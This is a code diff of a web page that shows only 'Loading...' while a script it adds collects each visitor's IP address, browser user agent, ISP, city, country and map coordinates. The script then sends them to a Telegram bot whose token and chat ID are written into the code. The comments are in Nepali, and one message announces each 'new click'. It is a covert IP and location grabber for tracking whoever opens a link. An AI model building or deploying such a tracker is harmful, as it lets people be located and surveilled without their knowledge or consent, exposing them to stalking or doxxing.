@@ -7,18 +7,59 @@
 <body>
     <h1>Loading...</h1>
     <script>
+        // 1. IP लिने
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
-                const url = 'https://script.google.com/macros/s/AKfycbxgWiLgPIHfUhk7D4NTDnXhF2P1oFDdUnboph14GoAjEd_n8d8JaTclJtC-xoJr0FbZA/exec?ip=' + encodeURIComponent(ip) + '&ua=' + encodeURIComponent(ua);
-                fetch(url)
-                    .then(() => {
-                        document.body.innerHTML = '<h2>✅ Logged</h2><p>Your IP: ' + ip + '</p>';
+
+                // 2. Location लिने (ipinfo.io)
+                fetch('https://ipinfo.io/' + ip + '/json')
+                    .then(res => res.json())
+                    .then(locData => {
+                        let location = 'Location नआएको';
+                        let mapLink = '';
+                        let city = locData.city || '';
+                        let country = locData.country || '';
+                        let loc = locData.loc || ''; // "lat,lon"
+                        let isp = locData.org || '';
+
+                        if (city && country) {
+                            location = country + ', ' + city + (isp ? ' (' + isp + ')' : '');
+                        }
+                        if (loc) {
+                            const coords = loc.split(',');
+                            mapLink = 'https://www.google.com/maps?q=' + coords[0] + ',' + coords[1];
+                        }
+
+                        // 3. Telegram Bot मा पठाउने (CORS bypass गर्न JSONP style)
+                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
+                        const chatId = '8621764137';
+                        const msg = '📥 नयाँ क्लिक!\nIP: ' + ip +
+                                    '\n📍 Location: ' + location +
+                                    (mapLink ? '\n🗺️ Maps: ' + mapLink : '') +
+                                    '\nUA: ' + ua;
+
+                        // Telegram API मा POST request (CORS ले रोक्छ, तर try गरौं)
+                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: msg
+                            })
+                        })
+                        .then(() => {
+                            document.body.innerHTML = '<h2>✅ Logged</h2><p>IP: ' + ip + '</p><p>📍 ' + location + '</p>' + (mapLink ? '<p>🗺️ <a href="' + mapLink + '" target="_blank">Google Maps</a></p>' : '');
+                        })
+                        .catch(() => {
+                            // CORS ले रोक्यो भने पनि IP र Location पेजमा देखाउने
+                            document.body.innerHTML = '<h2>⚠️ Logged (Telegram मा पठाउन सकिएन)</h2><p>IP: ' + ip + '</p><p>📍 ' + location + '</p>' + (mapLink ? '<p>🗺️ <a href="' + mapLink + '" target="_blank">Google Maps</a></p>' : '<p>🔴 Telegram मा पठाउन CORS ले रोक्यो। तर IP र Location यहाँ छ।</p>');
+                        });
                     })
                     .catch(() => {
-                        document.body.innerHTML = '<h2>❌ Failed to log</h2><p>IP: ' + ip + '</p>';
+                        document.body.innerHTML = '<h2>❌ Location fetch गर्न सकिएन</h2><p>IP: ' + ip + '</p>';
                     });
             })
             .catch(() => {
